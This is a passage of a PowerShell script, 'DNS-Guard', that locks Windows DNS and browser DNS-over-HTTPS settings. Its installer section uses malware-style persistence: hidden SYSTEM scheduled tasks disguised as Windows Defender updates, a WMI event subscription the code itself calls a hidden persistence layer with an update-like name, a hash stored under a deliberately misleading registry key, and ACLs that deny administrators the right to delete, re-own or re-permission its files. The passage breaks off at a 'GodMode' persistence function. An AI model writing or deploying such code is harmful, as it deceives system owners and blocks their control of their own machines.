        Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
    }
    Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters"
    Harden-RegistryKey -Path "Software\Policies\Microsoft\Windows\Network Connections" -IsCurrentUser
    Harden-RegistryKey -Path "SOFTWARE\Policies\Microsoft\Edge"
    Harden-RegistryKey -Path "SOFTWARE\Policies\Google\Chrome"
    Harden-RegistryKey -Path "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

    # Final status verification
    $FailedCount = 0
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    $HasDeny = $false
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny" -and $Rule.RegistryRights -like "*SetValue*") { $HasDeny = $true }
                        } catch {}
                    }
                    if (-not $HasDeny) { $FailedCount++; Write-Log -Message "Lock missing for adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
                    $RegKey.Close()
                }
            } catch { $FailedCount++; Write-Log -Message "Could not verify lock for adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
        }
    }
    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if (-not $NetConn -or $NetConn.NC_LanProperties -ne 0) { $FailedCount++; Write-Log -Message "GPO NC_LanProperties not enforced." -Type "ERROR" -Color Red }
    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -ne "off") { $FailedCount++; Write-Log -Message "Edge DoH not disabled." -Type "ERROR" -Color Red }
    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -ne "off") { $FailedCount++; Write-Log -Message "Chrome DoH not disabled." -Type "ERROR" -Color Red }
    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -ne 0) { $FailedCount++; Write-Log -Message "Firefox DoH not disabled." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] ALL DNS LOCKS DEPLOYED!" -ForegroundColor Green
        Write-DebugLog -FunctionName "Enable-DNSLock" -Action "EXIT" -Message "Success, FailedCount=0"
    } else {
        Write-Host "[PARTIAL] DNS LOCKS DEPLOYED WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
        Write-DebugLog -FunctionName "Enable-DNSLock" -Action "EXIT" -Message "Partial, FailedCount=$FailedCount"
    }
}

# ============================================================================
# 5. UNLOCK MODULE (DISABLE / ÅNGRA)
# ============================================================================

function Disable-DNSLock {
    Write-DebugLog -FunctionName "Disable-DNSLock" -Action "ENTRY"
    Write-Log -Message "Initiating Total Unlock (Ångra)..." -Type "ACTION" -Color Magenta

    # Restore hardened registry ACLs before attempting to modify values
    Write-Log -Message "Restoring hardened registry ACLs..." -Type "INFO" -Color Yellow
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid"
        Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
    }
    Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters"
    Restore-RegistryKey -Path "Software\Policies\Microsoft\Windows\Network Connections" -IsCurrentUser
    Restore-RegistryKey -Path "SOFTWARE\Policies\Microsoft\Edge"
    Restore-RegistryKey -Path "SOFTWARE\Policies\Google\Chrome"
    Restore-RegistryKey -Path "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }

            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    $RulesToRemove = @()

                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            # Remove locks for Admin, SYSTEM, AND the old Everyone rule just in case it was left behind
                            if (($RuleSid.Value -eq "S-1-5-32-544" -or $RuleSid.Value -eq "S-1-5-18" -or $RuleSid.Value -eq "S-1-1-0") -and $Rule.AccessControlType -eq "Deny") {
                                $RulesToRemove += $Rule
                            }
                        } catch {}
                    }

                    if ($RulesToRemove.Count -gt 0) {
                        foreach ($Rule in $RulesToRemove) { $Acl.RemoveAccessRule($Rule) }
                        $RegKey.SetAccessControl($Acl)
                        Write-Log -Message "Stripped Deny rules ($Proto) for adapter: $($Adapter.Name)" -Type "SUCCESS" -Color Green
                    }
                    $RegKey.Close()
                }
            } catch {
                Write-Log -Message "Failed to read $Proto adapter $($Adapter.Name)." -Type "ERROR" -Color Red
            }
        }
    }

    Write-Log -Message "Removing visual GPO restrictions..." -Type "INFO" -Color Yellow
    if (Test-Path $GpoPath) {
        Remove-ItemProperty -Path $GpoPath -Name "NC_LanProperties" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $GpoPath -Name "NC_LanChangeProperties" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $GpoPath -Name "NC_AllowAdvancedTCPIPConfig" -ErrorAction SilentlyContinue
    }

    Write-Log -Message "Removing Browser DoH Restrictions (Edge, Chrome, Firefox)..." -Type "INFO" -Color Yellow
    if (Test-Path $EdgePath) {
        Remove-ItemProperty -Path $EdgePath -Name "DnsOverHttpsMode" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $EdgePath -Name "BuiltInDnsClientEnabled" -ErrorAction SilentlyContinue
    }
    if (Test-Path $ChromePath) { Remove-ItemProperty -Path $ChromePath -Name "DnsOverHttpsMode" -ErrorAction SilentlyContinue }
    if (Test-Path $FirefoxPath) { Remove-ItemProperty -Path $FirefoxPath -Name "Enabled" -ErrorAction SilentlyContinue }

    ipconfig /flushdns | Out-Null

    Write-Log -Message "System restored to default Windows behaviors." -Type "SUCCESS" -Color Green
    Write-DebugLog -FunctionName "Disable-DNSLock" -Action "EXIT" -Message "Success"

    # Final status verification
    $FailedCount = 0
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny") { $FailedCount++; Write-Log -Message "Lock still present on adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
                        } catch {}
                    }
                    $RegKey.Close()
                }
            } catch { Write-Log -Message "Could not verify unlock for adapter $($Adapter.Name) ($Proto)." -Type "WARN" -Color Yellow }
        }
    }
    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if ($NetConn -and $NetConn.NC_LanProperties -eq 0) { $FailedCount++; Write-Log -Message "GPO NC_LanProperties still enforced." -Type "ERROR" -Color Red }
    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -eq "off") { $FailedCount++; Write-Log -Message "Edge DoH still disabled." -Type "ERROR" -Color Red }
    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -eq "off") { $FailedCount++; Write-Log -Message "Chrome DoH still disabled." -Type "ERROR" -Color Red }
    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -eq 0) { $FailedCount++; Write-Log -Message "Firefox DoH still disabled." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] ALL DNS LOCKS REMOVED!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] DNS LOCKS REMOVED WITH ERRORS! ($FailedCount items still locked)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 6. INSTALLER / PERSISTENCE MODULE (HARDENED)
# ============================================================================

function Install-Persistence {
    Write-DebugLog -FunctionName "Install-Persistence" -Action "ENTRY"
    Export-RawDebugDump -Trigger "DNS_INSTALL_START"
    Write-Log -Message "Installing DNS-Guard to System ($InstallDir)..." -Type "ACTION" -Color Yellow

    # 0. Installation Gate: Prevent overwriting existing installs
    if (Test-Path $InstallDir) {
        Write-Log -Message "Installation aborted: $InstallDir already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] DNS-Guard is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Write-Log -Message "Installation aborted: Scheduled task '$TaskName' already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] DNS-Guard is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    
    # 1. Secure Copy
    if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
    Copy-Item -Path $PSCommandPath -Destination $InstallScript -Force
    Write-Log -Message "Payload copied to $InstallScript." -Type "INFO" -Color Gray

    # Pre-build wrapper content and create all files inside $InstallDir BEFORE hardening ACLs
    $CmdBatContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$InstallScript`" %*"
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    Out-File -FilePath $CmdPathLocal -InputObject $CmdBatContent -Encoding ASCII -Force
    Write-Log -Message "Local wrapper created at $CmdPathLocal." -Type "INFO" -Color Gray

    # Pre-calculate integrity hash and write backup file before hardening
    $ScriptHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    Set-Content -Path $IntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
    Write-Log -Message "Self-integrity hash file written." -Type "INFO" -Color Gray
    
    # --- [NEW] NTFS PAYLOAD SELF-DEFENSE ---
    Write-Log -Message "Hardening NTFS Permissions on installation directory and files..." -Type "INFO" -Color Yellow
    try {
        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")

        # Set owner to SYSTEM on directory and all existing files (prevents admin takeown)
        $DirAcl = Get-Acl -Path $InstallDir
        $DirAcl.SetOwner($SidSystem)
        Set-Acl -Path $InstallDir -AclObject $DirAcl
        Get-ChildItem -Path $InstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetOwner($SidSystem)
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }

        # Harden directory ACL
        $DirAcl = Get-Acl -Path $InstallDir
        $DirAcl.SetAccessRuleProtection($true, $false)
        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
        
        # SYSTEM: FullControl
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        
        # Admins: ReadAndExecute only (cannot delete, modify, or change permissions)
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Authenticated Users: ReadAndExecute
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        
        Set-Acl -Path $InstallDir -AclObject $DirAcl

        # Explicitly harden each file (directory inheritance may not cover existing files perfectly)
        Get-ChildItem -Path $InstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetAccessRuleProtection($true, $false)
            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        
        Write-Log -Message "Installation directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "Failed to harden NTFS permissions: $_" -Type "ERROR" -Color Red
    }
    # ----------------------------------------
    
    # 2. Build the Global CLI Command (dnslock) in C:\Windows (ASCII encoding, no BOM)
    Out-File -FilePath $CmdPath -InputObject $CmdBatContent -Encoding ASCII -Force
    if (-not (Test-Path $CmdPath)) {
        Write-Log -Message "CRITICAL: Wrapper file was not created at $CmdPath!" -Type "ERROR" -Color Red
    } else {
        Write-Log -Message "Global CLI wrapper created at $CmdPath." -Type "SUCCESS" -Color Green
    }

    # 2.2 Add InstallDir to system PATH so dnslock is discoverable from any shell
    Write-Log -Message "Adding $InstallDir to system PATH..." -Type "INFO" -Color Yellow
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -notlike "*$InstallDir*") {
            $NewPath = $CurrentPath + ";" + $InstallDir
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Added $InstallDir to system PATH." -Type "SUCCESS" -Color Green
        } else {
            Write-Log -Message "$InstallDir already in system PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to update system PATH: $_" -Type "ERROR" -Color Red
    }

    # 2.3 Harden the wrapper files against tampering (but allow all users to execute them)
    Write-Log -Message "Hardening dnslock wrapper files..." -Type "INFO" -Color Yellow
    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
    foreach ($WrapperPath in @($CmdPath, $CmdPathLocal)) {
        if (Test-Path $WrapperPath) {
            try {
                $CmdAcl = Get-Acl -Path $WrapperPath
                $CmdAcl.SetOwner($SidSystem)
                $CmdAcl.SetAccessRuleProtection($true, $false)
                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
            } catch {
                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
            }
        }
    }
    Write-Log -Message "Wrapper files locked to SYSTEM (FullControl), Admins (ReadOnly+NoDelete), Users (ReadAndExecute)." -Type "SUCCESS" -Color Green

    Write-Log -Message "Registering self-healing background tasks..." -Type "INFO" -Color Yellow
    
    # 3. Triggers: Run at System Startup, User Logon, and Event ID 10000 (Network Connected)
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
    
    $CimClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace "Root/Microsoft/Windows/TaskScheduler"
    $Trigger3 = New-CimInstance -CimClass $CimClass -ClientOnly
    $Trigger3.Subscription = "<QueryList><Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'><Select Path='Microsoft-Windows-NetworkProfile/Operational'>*[System[EventID=10000]]</Select></Query></QueryList>"
    $Trigger3.Enabled = $True

    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2, $Trigger3) -Principal $PrincipalSettings -Force | Out-Null
    Write-Log -Message "Registered Scheduled Task: System will auto-heal locks on Reboot & Network Change." -Type "INFO" -Color Gray

    # 4. Guardian 1: Monitors every 5 minutes and restores if tampered
    $GuardianTaskName = "Windows-Defender-Platform-Update"
    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GuardianTaskName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
    Write-Log -Message "Guardian 1 '$GuardianTaskName' registered (5-minute heartbeat)." -Type "INFO" -Color Gray

    # 4.1 Guardian 2: Additional watcher with a 10-minute interval (attacker must kill both)
    $Guardian2Name = "Windows-Defender-AM-Updates"
    $Guardian2Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $Guardian2Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 9999)
    $Guardian2Principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $Guardian2Name -Action $Guardian2Action -Trigger $Guardian2Trigger -Principal $Guardian2Principal -Force | Out-Null
    Write-Log -Message "Guardian 2 '$Guardian2Name' registered (10-minute heartbeat)." -Type "INFO" -Color Gray

    # 4.2 WMI Event Subscription: Third hidden persistence layer (harder to find than tasks)
    Write-Log -Message "Registering WMI event subscription for persistence..." -Type "INFO" -Color Gray
    try {
        $WmiQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance.Name = 'Schedule'"
        $WmiConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="WindowsUpdateHealthCheck"; CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"; RunInteractively=$false} -ErrorAction Stop
        $WmiFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="WindowsUpdateHealthCheck"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query=$WmiQuery} -ErrorAction Stop
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WmiFilter; Consumer=$WmiConsumer} -ErrorAction Stop | Out-Null
        Write-Log -Message "WMI subscription registered (triggers if Schedule service is modified)." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "WMI subscription registration failed: $_" -Type "WARN" -Color Yellow
    }

    # 5. Self-Integrity: Store SHA256 hash in a misleading registry key (harder to tamper than a file)
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (-not (Test-Path $IntegrityRegPath)) { New-Item -Path $IntegrityRegPath -Force | Out-Null }
    Set-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
    Write-Log -Message "Self-integrity hash stored in registry (backup file already written)." -Type "INFO" -Color Gray

    Enable-DNSLock
    Write-Log -Message "INSTALLATION COMPLETE! System is permanently protected." -Type "SUCCESS" -Color Green

    # 6. GPO registry values are protection enough; skip ACL hardening to avoid gpupdate lock conflicts
    Write-Log -Message "GPO registry values enforced. Skipping ACL hardening to avoid gpupdate lock." -Type "INFO" -Color Gray

    # Final status verification
    $FailedCount = 0
    if (-not (Test-Path $InstallDir)) { $FailedCount++; Write-Log -Message "Install directory $InstallDir missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $InstallScript)) { $FailedCount++; Write-Log -Message "Install script $InstallScript missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $CmdPath)) { $FailedCount++; Write-Log -Message "Global CLI wrapper $CmdPath missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $IntegrityFile)) { $FailedCount++; Write-Log -Message "Integrity file $IntegrityFile missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task $TaskName missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian 1 $GuardianTaskName missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian 2 $Guardian2Name missing." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -notlike "*$InstallDir*") { $FailedCount++; Write-Log -Message "System PATH does not contain $InstallDir." -Type "ERROR" -Color Red }
    $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if (-not $WmiFilter) { Write-Log -Message "WMI event filter missing." -Type "WARN" -Color Yellow }
    $WmiConsumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if (-not $WmiConsumer) { Write-Log -Message "WMI event consumer missing." -Type "WARN" -Color Yellow }
    Export-RawDebugDump -Trigger "DNS_INSTALL_END"
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] INSTALLATION COMPLETE!" -ForegroundColor Green
        Write-DebugLog -FunctionName "Install-Persistence" -Action "EXIT" -Message "Success"
    } else {
        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
        Write-DebugLog -FunctionName "Install-Persistence" -Action "EXIT" -Message "Partial, FailedCount=$FailedCount"
    }
}

function Invoke-AsSystem {
    param(
        [string]$Command,
        [int]$MaxWaitSeconds = 30
    )
    $TaskId = Get-Random -Minimum 10000 -Maximum 99999
    $TempTaskName = "DNSGuard-Helper_$TaskId"
    $CommonTemp = "C:\Windows\Temp"
    $ResultFile = "$CommonTemp\DNSGuard_Result_$TaskId.txt"
    $BatchFile = "$CommonTemp\DNSGuard_Batch_$TaskId.cmd"
    Write-Log -Message "[DEBUG] Invoke-AsSystem called (TaskId=$TaskId)." -Type "INFO" -Color Yellow
    try {
        $BatchContent = @"
@echo off
cd /d $CommonTemp
$Command
if %errorlevel% equ 0 (
    echo ___SUCCESS___ > "$ResultFile"
) else (
    echo ___FAILED___ > "$ResultFile"
)
"@
        $BatchContent | Out-File -FilePath $BatchFile -Encoding ASCII -Force
        $Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatchFile`""
        $Principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $TempTaskName -Action $Action -Principal $Principal -Force | Out-Null
        Start-ScheduledTask -TaskName $TempTaskName
        $Waited = 0
        $Completed = $false
        $Success = $false
        while ($Waited -lt $MaxWaitSeconds) {
            Start-Sleep -Seconds 1
            $Waited++
            if (Test-Path $ResultFile) {
                $ResultText = Get-Content -Path $ResultFile -Raw -ErrorAction SilentlyContinue
                if ($ResultText -and ($ResultText.Contains("___SUCCESS___") -or $ResultText.Contains("___FAILED___"))) {
                    $Completed = $true
                    $Success = $ResultText.Contains("___SUCCESS___")
                    break
                }
            }
        }
        Unregister-ScheduledTask -TaskName $TempTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        $Output = ""
        if (Test-Path $ResultFile) {
            $ResultText = Get-Content -Path $ResultFile -Raw -ErrorAction SilentlyContinue
            $Output = ($ResultText -replace "___SUCCESS___", "" -replace "___FAILED___", "").Trim()
            Remove-Item -Path $ResultFile -Force -ErrorAction SilentlyContinue
        }
        Remove-Item -Path $BatchFile -Force -ErrorAction SilentlyContinue
        if ($Completed) {
            Write-Log -Message "[DEBUG] SYSTEM task $TempTaskName completed. Success=$Success" -Type "INFO" -Color Yellow
            return [PSCustomObject]@{ Success = $Success; Output = $Output }
        } else {
            Write-Log -Message "[DEBUG] SYSTEM task $TempTaskName did not complete within $MaxWaitSeconds seconds. Output: $Output" -Type "ERROR" -Color Red
            return [PSCustomObject]@{ Success = $false; Output = $Output }
        }
    } catch {
        Write-Log -Message "SYSTEM helper task failed: $_" -Type "ERROR" -Color Red
        Unregister-ScheduledTask -TaskName $TempTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        Remove-Item -Path $ResultFile -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $BatchFile -Force -ErrorAction SilentlyContinue
        return [PSCustomObject]@{ Success = $false; Output = "" }
    }
}

function Install-GodModePersistence {
    Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "ENTRY"
    Export-RawDebugDump -Trigger "GODMODE_INSTALL_START"
